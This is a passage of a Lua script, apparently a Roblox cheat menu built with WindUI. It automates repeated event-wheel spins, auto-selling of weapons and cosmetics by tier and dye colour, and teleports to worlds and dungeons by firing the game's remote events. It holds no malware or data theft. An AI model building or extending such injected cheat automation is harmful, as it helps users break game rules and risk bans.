        local cW = b4 and b4:GetChildren()[1]
        local cX = cW and cW.ID.Value
        if cX then
            Options.bossWepId:SetValue(cX)
            WindUI:Notify({
                Title = "Success",
                Content = 'Set ' .. bR[cW.Name].DisplayKey .. ' as your boss weapon!',
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "Error",
                Content = 'No suitable Primary Weapon Detected',
                Duration = 3
            })
        end
    end
})

--resetweaponsbuttonline
local ResetWeaponsButton = Tab3:Button({
    Title = "Reset Selected Weapons",
    Description = "Clear all selected weapons",
    Callback = function()
        Options.mobWepId:SetValue('')
        Options.bossWepId:SetValue('')
        WindUI:Notify({
            Title = "Success",
            Content = 'Selected weapons have been reset!',
            Duration = 3
        })
    end
})
end -- End Tab3 scope

-- ============== TAB4: EVENTS ==============
do -- Tab4 scope
--wheelspincountline
local WheelSpinCountInput = Tab4:Input({
    Title = "Wheel Spin Count",
    Description = "Number of wheel spins",
    Placeholder = "100",
    Value = "100",
    Numeric = true,
    Callback = function(value)
        local numValue = tonumber(value)
        if numValue and numValue > 0 then
            Options.wheelCount:SetValue(numValue)
        else
            Options.wheelCount:SetValue(100)
        end
    end
})
ConfigSystem.registerUIElement("wheelCount", WheelSpinCountInput)

--wheelspindelayline
local WheelSpinDelaySlider = Tab4:Slider({
    Title = "Wheel Spin Delay",
    Desc = "Delay between each spin (seconds)",
    Step = 0.1,
    Value = {
        Min = 0,
        Max = 5,
        Default = 0,
    },
    Callback = function(value)
        Options.wheelDelay:SetValue(value)
    end
})
ConfigSystem.registerUIElement("wheelDelay", WheelSpinDelaySlider)

--wheelspintimerlabelline
local WheelSpinTimerParagraph = Tab4:Paragraph({
    Title = "Spin Timer",
    Description = "100 spins in 00:00:00"
})

-- Hàm tính thời gian
local function updateWheelTimerLabel()
    local count = tonumber(Options.wheelCount.Value) or 100
    local delay = Options.wheelDelay.Value or 0
    local totalSeconds = math.floor((count - 1) * delay * 10 + 0.5) / 10  -- Thay math.round
    
    local hours = math.floor(totalSeconds / 3600)
    local minutes = math.floor((totalSeconds % 3600) / 60)
    local seconds = math.floor(totalSeconds % 60)
    
    WheelSpinTimerParagraph:SetDesc(
        count .. " spins in " .. 
        string.format("%02d:%02d:%02d", hours, minutes, seconds)
    )
end

-- Cập nhật label khi giá trị thay đổi
task.spawn(function()
    while task.wait(0.5) do
        pcall(updateWheelTimerLabel)  -- Thêm pcall để tránh crash
    end
end)

--spinwheelbuttonline
local SpinWheelButton = Tab4:Button({
    Title = "Spin Wheel With Settings Above",
    Description = "Spin wheel with settings above (double-click to confirm)",
    Callback = function()
        local dn = tonumber(Options.wheelCount.Value) or 100
        local dp = Options.wheelDelay.Value or 0
        
        if dn > 0 then
            local totalSeconds = math.floor((dn - 1) * dp * 10 + 0.5) / 10  -- Thay math.round
            local hours = math.floor(totalSeconds / 3600)
            local minutes = math.floor((totalSeconds % 3600) / 60)
            local seconds = math.floor(totalSeconds % 60)
            local timeStr = string.format("%02d:%02d:%02d", hours, minutes, seconds)
            
            WindUI:Notify({
                Title = "Wheel Spinner",
                Content = 'Spinning the wheel ' .. dn .. ' times in ' .. timeStr .. '!',
                Duration = 7
            })
            
            task.spawn(function()
                for z = 1, dn do
                    pcall(function()
                        a5.EventSpinner.JoinQueue:FireServer(c)
                    end)
                    task.wait(dp)
                end
                
                WindUI:Notify({
                    Title = "Wheel Spinner",
                    Content = 'Completed ' .. dn .. ' spins!',
                    Duration = 5
                })
            end)
        else
            WindUI:Notify({
                Title = "Error",
                Content = 'Spin count must be greater than 0!',
                Duration = 3
            })
        end
    end
})
end -- End Tab4 scope

-- ============== SECTION2: AUTO SELL ==============
do -- Wrap để tránh local limit
local Section2Tab1 = Section2:Tab({
    Title = "Sell Weapons",
    Icon = "circle-small",
    Locked = false,
})
--autoselltiersline
-- Paragraph hiển thị trạng thái
local AutoSellStatusParagraph = Section2Tab1:Paragraph({
    Title = "Current Auto Sell Status",
    Description = "None selected"
})

-- Hàm cập nhật trạng thái hiển thị
local function updateAutoSellStatus()
    local selected = Options.AutoSellTbl.Value
    local tierList = {}
    
    -- Build list of selected tiers
    for tier = 1, 5 do
        if selected[tier] then
            table.insert(tierList, "T" .. tier)
        end
    end
    
    if #tierList > 0 then
        AutoSellStatusParagraph:SetDesc("🎯 " .. table.concat(tierList, ", "))
    else
        AutoSellStatusParagraph:SetDesc("None selected")
    end
end

local AutoSellTiersDropdown = Section2Tab1:Dropdown({
    Title = "Auto Sell Tiers",
    Description = "Select which tiers to auto-sell",
    Values = {"Tier 1", "Tier 2", "Tier 3", "Tier 4", "Tier 5"},
    Multi = true,
    Callback = function(selected)
        -- Convert selected names to tier numbers
        local tbl = {}
        for _, tierName in pairs(selected) do
            local tierNum = tonumber(tierName:match("%d+"))
            if tierNum then
                tbl[tierNum] = true
            end
        end
        Options.AutoSellTbl:SetValue(tbl)
        updateAutoSellStatus()
    end
})
ConfigSystem.registerUIElement("AutoSellTbl", AutoSellTiersDropdown)

-- Khởi tạo trạng thái ban đầu
updateAutoSellStatus()

-- ✅ THÊM: Buttons để chọn nhanh
Section2Tab1:Button({
    Title = "Select Tier 1-3",
    Description = "Quick select tier 1, 2, 3",
    Callback = function()
        Options.AutoSellTbl:SetValue({[1]=true, [2]=true, [3]=true})
        -- Update dropdown UI
        AutoSellTiersDropdown:Set({"Tier 1", "Tier 2", "Tier 3"})
        updateAutoSellStatus()
        WindUI:Notify({
            Title = "Auto Sell",
            Content = "✅ Selected Tier 1-3",
            Duration = 2
        })
    end
})

Section2Tab1:Button({
    Title = "Select All Tiers",
    Description = "Select all tier 1-5",
    Callback = function()
        Options.AutoSellTbl:SetValue({[1]=true, [2]=true, [3]=true, [4]=true, [5]=true})
        -- Update dropdown UI
        AutoSellTiersDropdown:Set({"Tier 1", "Tier 2", "Tier 3", "Tier 4", "Tier 5"})
        updateAutoSellStatus()
        WindUI:Notify({
            Title = "Auto Sell",
            Content = "✅ Selected All Tiers",
            Duration = 2
        })
    end
})

Section2Tab1:Button({
    Title = "Clear Selection",
    Description = "Deselect all tiers",
    Callback = function()
        Options.AutoSellTbl:SetValue({})
        -- Update dropdown UI
        AutoSellTiersDropdown:Set({})
        updateAutoSellStatus()
        WindUI:Notify({
            Title = "Auto Sell",
            Content = "❌ Cleared Selection",
            Duration = 2
        })
    end
})
ConfigSystem.registerUIElement("AutoSellTbl", AutoSellTiersDropdown)

-- Khởi tạo trạng thái ban đầu
updateAutoSellStatus()
--sellallbuttonline
local SellAllButton = Section2Tab1:Button({
    Title = "Sell All",
    Description = "Sell all weapons and armor of selected tiers (double-click)",
    Callback = function()
        local cY = {}
        for z, R in bM:GetChildren() do
            local cZ = bR[R.Name]
            if (cZ.Type == 'Weapon' or cZ.Type == 'Armor') and 
               Options.AutoSellTbl.Value[c0:GetItemTier(R)] and
               not R:FindFirstChild('Locked') then
                table.insert(cY, R)
            end
        end
        if #cY > 0 then
            WindUI:Notify({
                Title = "Sell Items",
                Content = 'Sold ' .. #cY .. ' items',
                Duration = 3
            })
            a5.Drops.SellItems:InvokeServer(cY)
        else
            WindUI:Notify({
                Title = "Sell Items",
                Content = 'No items to sell',
                Duration = 3
            })
        end
    end
})

--autosellalltoggleline
local AutoSellAllToggle = Section2Tab1:Toggle({
    Title = "Auto Sell All",
    Desc = "Failsafe to sell all if auto sell doesn't finish at mission end",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.autoSellAll:SetValue(state)
        if state then
            local cY = {}
            for z, R in bM:GetChildren() do
                local cZ = bR[R.Name]
                if (cZ.Type == 'Weapon' or cZ.Type == 'Armor') and 
                   Options.AutoSellTbl.Value[c0:GetItemTier(R)] and
                   not R:FindFirstChild('Locked') then
                    table.insert(cY, R)
                end
            end
            if #cY > 0 then
                WindUI:Notify({
                    Title = "Auto Sell All",
                    Content = 'Sold ' .. #cY .. ' items',
                    Duration = 3
                })
                a5.Drops.SellItems:InvokeServer(cY)
            end
        end
    end
})
ConfigSystem.registerUIElement("autoSellAll", AutoSellAllToggle)

--autoselleggsline
local AutoSellEggsToggle = Section2Tab1:Toggle({
    Title = "Auto Sell Eggs",
    Desc = "Auto-sell eggs (works at Event Wheel Hub)",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.autoSellEggs:SetValue(state)
    end
})
ConfigSystem.registerUIElement("autoSellEggs", AutoSellEggsToggle)

-- Divider
Section2Tab1:Divider({
    Text = "Smart T5 Auto Sell"
})

--smartt5autosellline
local SmartT5AutoSellToggle = Section2Tab1:Toggle({
    Title = "Smart T5 Auto Sell",
    Desc = "Only keep T5 with perks above set thresholds",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.smartPerkSell:SetValue(state)
    end
})
ConfigSystem.registerUIElement("smartPerkSell", SmartT5AutoSellToggle)

-- ✅ SỬA: Wrap trong function
do
    local perksList = {}
    for perkKey, perkData in pairs(bQ) do
        table.insert(perksList, {
            key = perkKey,
            name = perkData.DisplayName,
            min = perkData.StatRange[1],
            max = perkData.StatRange[2]
        })
    end
    table.sort(perksList, function(a, b) return a.name < b.name end)

    for _, perk in ipairs(perksList) do
        local slider = Section2Tab1:Slider({
            Title = perk.name,
            Desc = "Minimum threshold to keep this perk",
            Step = 1,
            Value = {
                Min = math.round(perk.min * 100),
                Max = math.round(perk.max * 100),
                Default = math.round(perk.min * 100),
            },
            Callback = function(value)
                Options[perk.key]:SetValue(value)
            end
        })
        ConfigSystem.registerUIElement(perk.key, slider)
    end
end
end -- End Section2Tab1 scope

-- ============== SECTION2 TAB2: AUTO COSMETICS ==============
do -- Wrap để tránh local limit
local Section2Tab2 = Section2:Tab({
    Title = "Auto Cosmetics",
    Icon = "circle-small",
    Locked = false,
})

-- Tạo danh sách cosmetics từ bR (ItemDirectory)
local cosmeticsList = {}
local d2 = {}  -- Bảng chứa cosmetics thông thường
for itemName, itemData in pairs(bR) do
    if itemData.Type == 'Cosmetic' then
        d2[itemName] = itemData.DisplayKey
        table.insert(cosmeticsList, itemData.DisplayKey)
    end
end
table.sort(cosmeticsList)

-- Select Cosmetics Dropdown
Section2Tab2:Dropdown({
    Title = "Select Cosmetics",
    Description = "Select regular cosmetics to sell/recycle",
    Values = cosmeticsList,
    Multi = true,
    Callback = function(selected)
        Options.selectedCosmetics:SetValue(selected)
    end
})

-- Event Cosmetics (từ Event Wheel)
local eventCosmeticsList = {
    "Frosty Scarf",
    "Wolfspirit Helmet",
    "Wolfspirit Armor",
    "Festive Dress",
    "Ram Horns",
    "Candycane Antlers",
    "Carrot Nose",
    "Fluffy Jacket"
}
local d4 = {
    FrostyScarf = 'Frosty Scarf',
    WolfspiritHelmet = 'Wolfspirit Helmet',
    WolfspiritArmor = 'Wolfspirit Armor',
    FestiveDress = 'Festive Dress',
    RamHorns = 'Ram Horns',
    CandycaneAntlers = 'Candycane Antlers',
    CarrotNose = 'Carrot Nose',
    FluffyJacket = 'Fluffy Jacket'
}

-- Select Event Cosmetics Dropdown
Section2Tab2:Dropdown({
    Title = "Select Event Cosmetics",
    Description = "Select cosmetics from Event Wheel to sell/recycle",
    Values = eventCosmeticsList,
    Multi = true,
    Callback = function(selected)
        Options.selectedWheelCosmetics:SetValue(selected)
    end
})

-- Danh sách màu dye
local dyesList = {
    {Hex = '#FF1337', Name = 'Rainbow', SpecialType = true},
    {Hex = '#DDEADD', Name = 'Ghoul', SpecialType = true},
    {Hex = '#11CCEE', Name = 'Ice', SpecialType = true},
    {Hex = '#FFADED', Name = 'Faded', SpecialType = true},
    {Hex = '#F0F8FF', Name = 'Alice Blue'},
    {Hex = '#FAEBD7', Name = 'Antique White'},
    {Hex = '#00FFFF', Name = 'Aqua'},
    {Hex = '#7FFFD4', Name = 'Aquamarine'},
    {Hex = '#F0FFFF', Name = 'Azure'},
    {Hex = '#F5F5DC', Name = 'Beige'},
    {Hex = '#FFE4C4', Name = 'Bisque'},
    {Hex = '#000000', Name = 'Black'},
    {Hex = '#FFEBCD', Name = 'Blanched Almond'},
    {Hex = '#0000FF', Name = 'Blue'},
    {Hex = '#8A2BE2', Name = 'Blue Violet'},
    {Hex = '#A52A2A', Name = 'Brown'},
    {Hex = '#DEB887', Name = 'Burly Wood'},
    {Hex = '#5F9EA0', Name = 'Cadet Blue'},
    {Hex = '#7FFF00', Name = 'Chartreuse'},
    {Hex = '#D2691E', Name = 'Chocolate'},
    {Hex = '#FF7F50', Name = 'Coral'},
    {Hex = '#6495ED', Name = 'Cornflower Blue'},
    {Hex = '#FFF8DC', Name = 'Cornsilk'},
    {Hex = '#DC143C', Name = 'Crimson'},
    {Hex = '#00FFFF', Name = 'Cyan'},
    {Hex = '#00008B', Name = 'Dark Blue'},
    {Hex = '#008B8B', Name = 'Dark Cyan'},
    {Hex = '#B8860B', Name = 'Dark Goldenrod'},
    {Hex = '#A9A9A9', Name = 'Dark Gray'},
    {Hex = '#006400', Name = 'Dark Green'},
    {Hex = '#BDB76B', Name = 'Dark Khaki'},
    {Hex = '#8B008B', Name = 'Dark Magenta'},
    {Hex = '#556B2F', Name = 'Dark Olive Green'},
    {Hex = '#FF8C00', Name = 'Dark Orange'},
    {Hex = '#9932CC', Name = 'Dark Orchid'},
    {Hex = '#8B0000', Name = 'Dark Red'},
    {Hex = '#E9967A', Name = 'Dark Salmon'},
    {Hex = '#8FBC8F', Name = 'Dark Sea Green'},
    {Hex = '#483D8B', Name = 'Dark Slate Blue'},
    {Hex = '#2F4F4F', Name = 'Dark Slate Gray'},
    {Hex = '#00CED1', Name = 'Dark Turquoise'},
    {Hex = '#9400D3', Name = 'Dark Violet'},
    {Hex = '#FF1493', Name = 'Deep Pink'},
    {Hex = '#00B7EB', Name = 'Deep Sky Blue'},
    {Hex = '#696969', Name = 'Dim Gray'},
    {Hex = '#1E90FF', Name = 'Dodger Blue'},
    {Hex = '#B22222', Name = 'Firebrick'},
    {Hex = '#FFFAF0', Name = 'Floral White'},
    {Hex = '#228B22', Name = 'Forest Green'},
    {Hex = '#FF00FF', Name = 'Fuchsia'},
    {Hex = '#DCDCDC', Name = 'Gainsboro'},
    {Hex = '#F8F8FF', Name = 'Ghost White'},
    {Hex = '#FFD700', Name = 'Gold'},
    {Hex = '#DAA520', Name = 'Goldenrod'},
    {Hex = '#808080', Name = 'Gray'},
    {Hex = '#008000', Name = 'Green'},
    {Hex = '#ADFF2F', Name = 'Green Yellow'},
    {Hex = '#F0FFF0', Name = 'Honeydew'},
    {Hex = '#FF69B4', Name = 'Hot Pink'},
    {Hex = '#CD5C5C', Name = 'Indian Red'},
    {Hex = '#4B0082', Name = 'Indigo'},
    {Hex = '#FFFFF0', Name = 'Ivory'},
    {Hex = '#F0E68C', Name = 'Khaki'},
    {Hex = '#E6E6FA', Name = 'Lavender'},
    {Hex = '#FFF0F5', Name = 'Lavender Blush'},
    {Hex = '#7CFC00', Name = 'Lawn Green'},
    {Hex = '#FFFACD', Name = 'Lemon Chiffon'},
    {Hex = '#ADD8E6', Name = 'Light Blue'},
    {Hex = '#F08080', Name = 'Light Coral'},
    {Hex = '#E0FFFF', Name = 'Light Cyan'},
    {Hex = '#FAFAD2', Name = 'Light Goldenrod Yellow'},
    {Hex = '#D3D3D3', Name = 'Light Gray'},
    {Hex = '#90EE90', Name = 'Light Green'},
    {Hex = '#FFB6C1', Name = 'Light Pink'},
    {Hex = '#FFA07A', Name = 'Light Salmon'},
    {Hex = '#20B2AA', Name = 'Light Sea Green'},
    {Hex = '#87CEFA', Name = 'Light Sky Blue'},
    {Hex = '#778899', Name = 'Light Slate Gray'},
    {Hex = '#B0C4DE', Name = 'Light Steel Blue'},
    {Hex = '#FFFFE0', Name = 'Light Yellow'},
    {Hex = '#00FF00', Name = 'Lime'},
    {Hex = '#32CD32', Name = 'Lime Green'},
    {Hex = '#FAF0E6', Name = 'Linen'},
    {Hex = '#FF00FF', Name = 'Magenta'},
    {Hex = '#800000', Name = 'Maroon'},
    {Hex = '#66CDAA', Name = 'Medium Aquamarine'},
    {Hex = '#0000CD', Name = 'Medium Blue'},
    {Hex = '#BA55D3', Name = 'Medium Orchid'},
    {Hex = '#9370DB', Name = 'Medium Purple'},
    {Hex = '#3CB371', Name = 'Medium Sea Green'},
    {Hex = '#7B68EE', Name = 'Medium Slate Blue'},
    {Hex = '#00FA9A', Name = 'Medium Spring Green'},
    {Hex = '#48D1CC', Name = 'Medium Turquoise'},
    {Hex = '#C71585', Name = 'Medium Violet Red'},
    {Hex = '#191970', Name = 'Midnight Blue'},
    {Hex = '#F5FFFA', Name = 'Mint Cream'},
    {Hex = '#FFE4E1', Name = 'Misty Rose'},
    {Hex = '#FFE4B5', Name = 'Moccasin'},
    {Hex = '#FFDEAD', Name = 'Navajo White'},
    {Hex = '#000080', Name = 'Navy'},
    {Hex = '#FDF5E6', Name = 'Old Lace'},
    {Hex = '#808000', Name = 'Olive'},
    {Hex = '#6B8E23', Name = 'Olive Drab'},
    {Hex = '#FFA500', Name = 'Orange'},
    {Hex = '#FF4500', Name = 'Orange Red'},
    {Hex = '#DA70D6', Name = 'Orchid'},
    {Hex = '#EEE8AA', Name = 'Pale Goldenrod'},
    {Hex = '#98FB98', Name = 'Pale Green'},
    {Hex = '#AFEEEE', Name = 'Pale Turquoise'},
    {Hex = '#DB7093', Name = 'Pale Violet Red'},
    {Hex = '#FFEFD5', Name = 'Papaya Whip'},
    {Hex = '#FFDAB9', Name = 'Peach Puff'},
    {Hex = '#CD853F', Name = 'Peru'},
    {Hex = '#FFC0CB', Name = 'Pink'},
    {Hex = '#DDA0DD', Name = 'Plum'},
    {Hex = '#B0E0E6', Name = 'Powder Blue'},
    {Hex = '#800080', Name = 'Purple'},
    {Hex = '#FF0000', Name = 'Red'},
    {Hex = '#BC8F8F', Name = 'Rosy Brown'},
    {Hex = '#4169E1', Name = 'Royal Blue'},
    {Hex = '#8B4513', Name = 'Saddle Brown'},
    {Hex = '#FA8072', Name = 'Salmon'},
    {Hex = '#F4A460', Name = 'Sandy Brown'},
    {Hex = '#2E8B57', Name = 'Sea Green'},
    {Hex = '#FFF5EE', Name = 'Sea Shell'},
    {Hex = '#A0522D', Name = 'Sienna'},
    {Hex = '#C0C0C0', Name = 'Silver'},
    {Hex = '#87CEEB', Name = 'Sky Blue'},
    {Hex = '#6A5ACD', Name = 'Slate Blue'},
    {Hex = '#708090', Name = 'Slate Gray'},
    {Hex = '#FFFAFA', Name = 'Snow'},
    {Hex = '#00FF7F', Name = 'Spring Green'},
    {Hex = '#4682B4', Name = 'Steel Blue'},
    {Hex = '#D2B48C', Name = 'Tan'},
    {Hex = '#008080', Name = 'Teal'},
    {Hex = '#D8BFD8', Name = 'Thistle'},
    {Hex = '#FF6347', Name = 'Tomato'},
    {Hex = '#40E0D0', Name = 'Turquoise'},
    {Hex = '#EE82EE', Name = 'Violet'},
    {Hex = '#F5DEB3', Name = 'Wheat'},
    {Hex = '#FFFFFF', Name = 'White'},
    {Hex = '#F5F5F5', Name = 'White Smoke'},
    {Hex = '#FFFF00', Name = 'Yellow'},
    {Hex = '#9ACD32', Name = 'Yellow Green'}
}

-- Tạo danh sách tên dye để hiển thị
local dyeNamesList = {}
for _, dye in ipairs(dyesList) do
    table.insert(dyeNamesList, dye.Name)
end

-- Select Desired Dyes Dropdown
Section2Tab2:Dropdown({
    Title = "Select Desired Dyes",
    Description = "Cosmetics with these colors or near will NOT be sold/recycled",
    Values = dyeNamesList,
    Multi = true,
    Callback = function(selected)
        Options.selectedDyes:SetValue(selected)
    end
})

-- Color Distance Threshold Slider
Section2Tab2:Slider({
    Title = "Color Distance Threshold",
    Desc = "Keep dyes close to desired color (0 = exact match only)",
    Step = 1,
    Value = {
        Min = 0,
        Max = 200,
        Default = 100,
    },
    Callback = function(value)
        Options.colorDistanceThreshold:SetValue(value)
    end
})

-- Auto Sell Cosmetics Toggle
Section2Tab2:Toggle({
    Title = "Auto Sell Cosmetics",
    Desc = "Auto-sell selected cosmetics (except desired colors)",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.autoSellCosmetics:SetValue(state)
        if state and Toggles.autoRecycleCosmetics.Value then
            Toggles.autoRecycleCosmetics:SetValue(false)
            WindUI:Notify({
                Title = "Auto Cosmetics",
                Content = "Auto Recycle Cosmetics has been disabled",
                Duration = 3
            })
        end
    end
})

-- Auto Recycle Cosmetics Toggle
Section2Tab2:Toggle({
    Title = "Auto Recycle Cosmetics",
    Desc = "Auto-recycle selected cosmetics (except desired colors)",
    Icon = "flower",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        Toggles.autoRecycleCosmetics:SetValue(state)
        if state and Toggles.autoSellCosmetics.Value then
            Toggles.autoSellCosmetics:SetValue(false)
            WindUI:Notify({
                Title = "Auto Cosmetics",
                Content = "Auto Sell Cosmetics has been disabled",
                Duration = 3
            })
        end
    end
})

-- Hàm helper: Chuyển Color3 sang Hex
local function color3ToHex(color)
    local r = math.floor(color.R * 255 + 0.5)
    local g = math.floor(color.G * 255 + 0.5)
    local b = math.floor(color.B * 255 + 0.5)
    return string.format("#%02X%02X%02X", r, g, b)
end

-- Hàm helper: Chuyển Hex sang RGB
local function hexToRGB(hex)
    hex = hex:gsub("#", "")
    return tonumber("0x" .. hex:sub(1, 2)), tonumber("0x" .. hex:sub(3, 4)), tonumber("0x" .. hex:sub(5, 6))
end

-- Hàm helper: Tính khoảng cách màu
local function colorDistance(hex1, hex2)
    local r1, g1, b1 = hexToRGB(hex1)
    local r2, g2, b2 = hexToRGB(hex2)
    return math.sqrt((r2 - r1) ^ 2 + (g2 - g1) ^ 2 + (b2 - b1) ^ 2)
end

-- Hàm kiểm tra xem có nên giữ cosmetic dựa trên màu dye
local function desiredColorCheck(cosmetic)
    if cosmetic and cosmetic:FindFirstChild('Dye') and cosmetic.Dye.Value then
        local cosmeticHex = color3ToHex(cosmetic.Dye.Value)
        
        for _, dye in ipairs(dyesList) do
            if Options.selectedDyes.Value[dye.Name] then
                -- Nếu màu trùng chính xác
                if cosmeticHex == dye.Hex then
                    -- Keep cosmetic with exact color match
                    return true
                end
                
                -- Nếu không phải màu đặc biệt, kiểm tra khoảng cách màu
                if not dye.SpecialType then
                    local distance = colorDistance(cosmeticHex, dye.Hex)
                    if distance <= Options.colorDistanceThreshold.Value then
                        -- Keep cosmetic with close color match
                        return true
                    end
                end
            end
        end
    end
    return false
end

-- Sell Selected Cosmetics Button
Section2Tab2:Button({
    Title = "Sell Selected Cosmetics",
    Description = "Sell all selected cosmetics (except desired colors, double-click)",
    Callback = function()
        local itemsToSell = {}
        for _, cosmetic in pairs(bN:GetChildren()) do
            local displayName = d2[cosmetic.Name] or d4[cosmetic.Name] or 'none'
            if (Options.selectedCosmetics.Value[displayName] or Options.selectedWheelCosmetics.Value[displayName]) and
               not cosmetic:FindFirstChild('Locked') and
               not desiredColorCheck(cosmetic) then
                table.insert(itemsToSell, cosmetic)
            end
        end
        
        if #itemsToSell > 0 then
            WindUI:Notify({
                Title = "Sell Cosmetics",
                Content = 'Sold ' .. #itemsToSell .. ' cosmetics',
                Duration = 3
            })
            sell(itemsToSell)
        else
            WindUI:Notify({
                Title = "Sell Cosmetics",
                Content = 'No cosmetics to sell',
                Duration = 3
            })
        end
    end
})

-- Recycle Selected Cosmetics Button
Section2Tab2:Button({
    Title = "Recycle Selected Cosmetics",
    Description = "Recycle all selected cosmetics (except desired colors, double-click)",
    Callback = function()
        local itemsToRecycle = {}
        for _, cosmetic in pairs(bN:GetChildren()) do
            local displayName = d2[cosmetic.Name] or d4[cosmetic.Name] or 'none'
            if (Options.selectedCosmetics.Value[displayName] or Options.selectedWheelCosmetics.Value[displayName]) and
               not cosmetic:FindFirstChild('Locked') and
               not desiredColorCheck(cosmetic) then
                table.insert(itemsToRecycle, cosmetic)
            end
        end
        
        if #itemsToRecycle > 0 then
            WindUI:Notify({
                Title = "Recycle Cosmetics",
                Content = 'Recycled ' .. #itemsToRecycle .. ' cosmetics',
                Duration = 3
            })
            recycle(itemsToRecycle)
        else
            WindUI:Notify({
                Title = "Recycle Cosmetics",
                Content = 'No cosmetics to recycle',
                Duration = 3
            })
        end
    end
})

-- Auto sell/recycle cosmetic khi nhận được từ wheel
if aE then  -- aE là biến kiểm tra xem có đang ở Event không
    bN.ChildAdded:Connect(function(cosmetic)
        if Toggles.autoSellCosmetics.Value or Toggles.autoRecycleCosmetics.Value then
            local displayName = d4[cosmetic.Name]
            if displayName then
                cosmetic:WaitForChild('Dye', 5)
                if Options.selectedWheelCosmetics.Value[displayName] and 
                   not cosmetic:FindFirstChild('Locked') and
                   not desiredColorCheck(cosmetic) then
                    if Toggles.autoSellCosmetics.Value then
                        sell({cosmetic})
                    end
                    if Toggles.autoRecycleCosmetics.Value then
                        recycle({cosmetic})
                    end
                end
            end
        end
    end)
end
end -- End Section2Tab2 scope

-- ============== TELEPORT TAB ==============
do -- Wrap trong do...end để tránh vượt 200 local limit
    local TeleportTab = Window:Tab({
        Title = "Teleports",
        Icon = "map-pin",
        Locked = false
    })
    
    TeleportTab:Section({Title = "World Teleports"})
    
    -- World teleport buttons
    local cb = 15
    for z = 1, cb do
        for worldKey, worldData in pairs(cc) do
            if worldData.OrderId == z then
                TeleportTab:Button({
                    Title = worldData.Name,
                    Description = "Teleport to " .. worldData.Name,
                    Callback = function()
                        if alive() then
                            a5.Teleport.TeleportToHub:FireServer(worldData.Id)
                            libNoti("🗺️ Teleporting to " .. worldData.Name)
                        else
                            libNoti("❌ You must be alive to teleport!")
                        end
                    end
                })
            end
        end
    end
    
    TeleportTab:Section({Title = "Tower Teleports"})
    
    -- Tower teleport buttons
    local aA = {21, 23, 27, 29, 34, 43}
    for towerIndex, towerId in ipairs(aA) do
        if bO[towerId] then
            TeleportTab:Button({
                Title = bO[towerId].NameTag .. " (T" .. towerIndex .. ")",
                Description = "Start " .. bO[towerId].NameTag,
                Callback = function()
                    if alive() then
                        StartRaid(towerId)
                        libNoti("🗼 Starting " .. bO[towerId].NameTag)
                    else
                        libNoti("❌ You must be alive to start tower!")
                    end
                end
            })
        end
    end
    
    TeleportTab:Section({Title = "Nightmare Dungeons"})
    
    -- Challenge Mode toggle cho Nightmare Dungeons
    local NightmareChallengeToggle = TeleportTab:Toggle({
        Title = "Challenge Mode",
        Desc = "Enable Challenge Mode (Difficulty 5) for Nightmare Dungeons",
        Icon = "flower",
        Type = "Checkbox",
        Default = true,
        Callback = function(state)
            -- Lưu vào biến ao
            ao.NightmareChallengeMode = state
        end
    })
    
    -- Nightmare dungeon teleport buttons
    local aB = {1005, 1006, 1007}
    for nmIndex, nmId in ipairs(aB) do
        if bO[nmId] then
            local dungeonName = string.gsub(bO[nmId].NameTag, '%(NIGHTMARE%) ', '')
            local displayName = dungeonName .. " " .. bO[nmId].DisplayWorldID .. "-" .. bO[nmId].WorldMissionID
            
            TeleportTab:Button({
                Title = displayName,
                Description = "Start Nightmare Dungeon",
                Callback = function()
                    if alive() then
                        local difficulty = ao.NightmareChallengeMode and 5 or 1
                        StartRaid(nmId, difficulty)
                        libNoti("💀 Starting " .. dungeonName .. " (Difficulty " .. difficulty .. ")")
                    else
                        libNoti("❌ You must be alive to start nightmare dungeon!")
                    end
                end
            })
        end
    end
end
-- ============== KẾT THÚC TELEPORT TAB ==============
-- ============== STATS TAB ==============
do -- Wrap để tránh local limit
-- Function tạo Stats Tab (để giảm local variables trong scope chính)
local function createStatsTab()
    local StatsTab = Window:Tab({
        Title = "Stats",
        Icon = "chart-column-big",
        Locked = false
    })
    
    StatsTab:Section({Title = "Session Statistics"})
    
    -- Khởi tạo session start time
    if not g then g = tick() end
    
    -- UI Paragraphs
    local para1 = StatsTab:Paragraph({
        Title = "💰 Gold Gained",
        Description = formatNumberWithCommas(b0.Value - b1)
    })
    
    local para2 = StatsTab:Paragraph({
        Title = "📈 Gold Rate",
        Description = "Calculating..."
    })
    
    local para3 = StatsTab:Paragraph({
        Title = "🏆 Total Gold",
        Description = formatNumberWithCommas(b0.Value)
    })
    
    local para4 = StatsTab:Paragraph({
        Title = "⏱️ Session Time",
        Description = "0s"
    })
    
    StatsTab:Section({Title = "Cross-Session Statistics"})
    
    -- Cross-session variables
    local csTime = ao.CrossSessionTimestamp or tick()
    local csGold = ao.CrossSessionGold or b2
    
    local para5 = StatsTab:Paragraph({
        Title = "🕐 Cross-Session Time",
        Description = timeElapsed(tick() - csTime)
    })
    
    local para6 = StatsTab:Paragraph({
        Title = "💎 CS Gold Gain",
        Description = formatNumberWithCommas(b2 - csGold)
    })
    
    -- Reset buttons
    StatsTab:Button({
        Title = "🔄 Reset CS Time",
        Description = "Reset cross-session time",
        Callback = function()
            csTime = tick()
            ao.CrossSessionTimestamp = csTime
            save()
            para5:SetDesc("0s")
            libNoti("✅ CS time has been reset!")
        end
    })
    
    StatsTab:Button({
        Title = "🔄 Reset CS Gold",
        Description = "Reset cross-session gold",
        Callback = function()
            csGold = b2
            ao.CrossSessionGold = csGold
            save()
            para6:SetDesc("0")
            libNoti("✅ CS gold has been reset!")
        end
    })
    
    -- Init cross-session data
    if not ao.CrossSessionTimestamp then
        ao.CrossSessionTimestamp = csTime
        save()
    end
    if not ao.CrossSessionGold then
        ao.CrossSessionGold = csGold
        save()
    end
    
    -- Gold rate vars
    local rateStartT, rateStartG, rateFirst = nil, nil, true
    
    -- Update task
    task.spawn(function()
        while true do
            -- Gold updates
            if b0.Value ~= b2 then
                b2 = b0.Value
                
                if rateFirst then
                    rateFirst = false
                    rateStartT = tick()
                    rateStartG = b2
                else
                    local dt = tick() - rateStartT
                    if dt > 0 then
                        local r = math.floor((b2 - rateStartG) / dt * 600) / 10
